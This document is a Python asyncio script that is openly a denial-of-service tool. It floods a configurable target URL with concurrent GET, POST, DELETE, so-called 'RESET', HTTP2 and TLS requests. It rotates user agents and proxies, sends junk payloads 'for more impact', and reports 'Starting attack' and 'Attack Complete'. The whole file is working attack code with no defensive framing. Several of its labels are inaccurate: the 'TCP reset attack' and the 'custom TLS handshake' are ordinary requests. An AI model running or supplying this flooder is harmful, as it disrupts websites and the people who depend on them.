import asyncio
import random
import time
import os
import json
import aiohttp
import ssl
import socket
import uvloop
from urllib.parse import urlparse

# Set uvloop for better performance
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

# Configuration
TARGET_URL = os.getenv("TARGET_URL", "https://example.com")
DURATION = int(os.getenv("DURATION", "60"))
CONCURRENCY = int(os.getenv("CONCURRENCY", "500"))
REQ_PER_SEC = int(os.getenv("REQ_PER_SEC", "100"))
PROXY_FILE = os.getenv("PROXY_FILE", "")
METHODS = os.getenv("METHODS", "GET,POST,DELETE,RESET").split(",")
WORKERS = int(os.getenv("WORKERS", "10"))

# User agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
]

# Stats
stats = {
    "success": 0,
    "error": 0,
    "bytes_sent": 0,
    "start_time": None,
    "methods": {method: 0 for method in METHODS}
}

# Load proxies
proxies = []
if PROXY_FILE and os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    print(f"Loaded {len(proxies)} proxies")

# Create connector with optimized settings
connector = aiohttp.TCPConnector(
    limit=0,  # No connection limit
    limit_per_host=0,  # No per-host limit
    force_close=True,
    enable_cleanup_closed=True,
    use_dns_cache=True,
    ttl_dns_cache=300,
    family=socket.AF_INET,  # Use IPv4 for faster connections
    ssl=False
)

# Create session with optimized settings
timeout = aiohttp.ClientTimeout(total=5, connect=2)
session = aiohttp.ClientSession(
    connector=connector,
    timeout=timeout,
    headers={"User-Agent": random.choice(USER_AGENTS)}
)

async def http_flood(method, url):
    global stats
    
    try:
        if method == "GET":
            async with session.get(url, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(str(response.headers))
                return response.status
        elif method == "POST":
            # Larger payload for more impact
            data = "x" * 10240  # 10KB payload
            async with session.post(url, data=data, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(data) + len(str(response.headers))
                return response.status
        elif method == "DELETE":
            async with session.delete(url, ssl=False) as response:
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(str(response.headers))
                return response.status
        elif method == "RESET":
            # TCP reset attack
            parsed_url = urlparse(url)
            try:
                reader, writer = await asyncio.open_connection(
                    parsed_url.hostname, 
                    parsed_url.port or (443 if parsed_url.scheme == 'https' else 80),
                    ssl=(parsed_url.scheme == 'https')
                )
                
                request = f"RESET / HTTP/1.1\r\nHost: {parsed_url.hostname}\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                
                # Abruptly close connection (RST)
                writer.close()
                try:
                    await writer.wait_closed()
                except:
                    pass
                
                stats["success"] += 1
                stats["methods"][method] += 1
                stats["bytes_sent"] += len(request)
                return 499  # Custom code for connection closed
            except:
                stats["error"] += 1
                return None
    except:
        stats["error"] += 1
        return None

async def http2_flood(url):
    global stats
    
    try:
        # Force HTTP/2 with minimal headers
        async with session.get(
            url, 
            ssl=False,
            headers={"User-Agent": random.choice(USER_AGENTS)}
        ) as response:
            stats["success"] += 1
            stats["methods"]["HTTP2"] = stats["methods"].get("HTTP2", 0) + 1
            stats["bytes_sent"] += len(str(response.headers))
            return response.status
    except:
        stats["error"] += 1
        return None

async def tls_flood(url):
    global stats
    
    try:
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        
        # Create raw TLS connection
        reader, writer = await asyncio.open_connection(hostname, port, ssl=(parsed_url.scheme == 'https'))
        
        # Craft custom TLS handshake
        request = f"GET / HTTP/1.1\r\nHost: {hostname}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n"
        writer.write(request.encode())
        await writer.drain()
        
        # Read partial response
        await reader.read(1024)
        
        # Close connection
        writer.close()
        try:
            await writer.wait_closed()
        except:
            pass
        
        stats["success"] += 1
        stats["methods"]["TLS"] = stats["methods"].get("TLS", 0) + 1
        stats["bytes_sent"] += len(request)
        return 200
    except:
        stats["error"] += 1
        return None

async def worker(worker_id):
    global stats
    
    start_time = time.time()
    last_print = start_time
    last_count = 0
    
    while time.time() - start_time < DURATION:
        # Calculate required delay to maintain REQ_PER_SEC
        current_time = time.time()
        elapsed = current_time - start_time
        
        # Print stats every 5 seconds
        if current_time - last_print >= 5:
            rps = (stats["success"] - last_count) / (current_time - last_print)
            print(f"Worker {worker_id}: RPS: {rps:.1f} | Total: {stats['success']}/{stats['error']} | Methods: {stats['methods']}")
            last_print = current_time
            last_count = stats["success"]
        
        # Create batch of requests for better performance
        tasks = []
        for _ in range(REQ_PER_SEC // WORKERS):
            method = random.choice(METHODS)
            
            if method in ["GET", "POST", "DELETE", "RESET"]:
                tasks.append(http_flood(method, TARGET_URL))
            elif method == "HTTP2":
                tasks.append(http2_flood(TARGET_URL))
            elif method == "TLS":
                tasks.append(tls_flood(TARGET_URL))
        
        # Execute all tasks concurrently
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Calculate delay to maintain rate
        batch_time = time.time() - current_time
        target_batch_time = 1.0 / WORKERS  # Each worker handles 1/WORKERS of a second
        if batch_time < target_batch_time:
            await asyncio.sleep(target_batch_time - batch_time)

async def main():
    global stats
    stats["start_time"] = time.time()
    
    print(f"Starting attack on {TARGET_URL}")
    print(f"Duration: {DURATION}s | Concurrency: {CONCURRENCY} | Workers: {WORKERS} | Methods: {METHODS}")
    print(f"Target RPS: {REQ_PER_SEC}")
    
    # Create workers
    tasks = [worker(i) for i in range(WORKERS)]
    await asyncio.gather(*tasks)
    
    # Close session
    await session.close()
    
    # Print final stats
    elapsed = time.time() - stats["start_time"]
    rps = stats["success"] / max(elapsed, 1)
    mb_sent = stats["bytes_sent"] / (1024 * 1024)
    
    print("\n=== Attack Complete ===")
    print(f"Target: {TARGET_URL}")
    print(f"Duration: {elapsed:.1f}s")
    print(f"Requests: {stats['success']}/{stats['error']}")
    print(f"RPS: {rps:.1f}")
    print(f"Data sent: {mb_sent:.2f} MB")
    print(f"Methods: {stats['methods']}")

if __name__ == "__main__":
    asyncio.run(main())
